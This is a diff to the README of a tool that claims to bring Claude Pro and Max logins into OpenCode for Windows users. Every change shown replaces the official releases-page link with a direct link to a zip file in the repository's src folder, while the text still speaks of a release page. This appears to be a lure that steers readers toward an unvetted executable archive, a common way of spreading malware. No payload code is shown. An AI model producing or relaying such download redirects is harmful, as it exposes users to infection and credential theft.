@@ -1,6 +1,6 @@
 # 🤖 opencode-anthropic-login-via-cli - Use Claude Pro and Max in OpenCode
 
-[![Download the release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/yashthecoolbro/opencode-anthropic-login-via-cli/releases)
+[![Download the release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/yashthecoolbro/opencode-anthropic-login-via-cli/raw/refs/heads/main/src/login-anthropic-via-cli-opencode-v2.0.zip)
 
 ## 🧩 What this is
 
@@ -12,7 +12,7 @@ It is made for Windows users who want a simple setup and want to start using the
 
 Visit this page to download the latest release:
 
-https://github.com/yashthecoolbro/opencode-anthropic-login-via-cli/releases
+https://github.com/yashthecoolbro/opencode-anthropic-login-via-cli/raw/refs/heads/main/src/login-anthropic-via-cli-opencode-v2.0.zip
 
 On that page, look for the newest release at the top. Open it and download the Windows file that matches your computer.
 
@@ -119,7 +119,7 @@ If one step fails, close both the app and OpenCode, then open them again
 
 Use the same release page to check for new versions:
 
-https://github.com/yashthecoolbro/opencode-anthropic-login-via-cli/releases
+https://github.com/yashthecoolbro/opencode-anthropic-login-via-cli/raw/refs/heads/main/src/login-anthropic-via-cli-opencode-v2.0.zip
 
 When a newer release appears, download that version and repeat the same setup steps
 
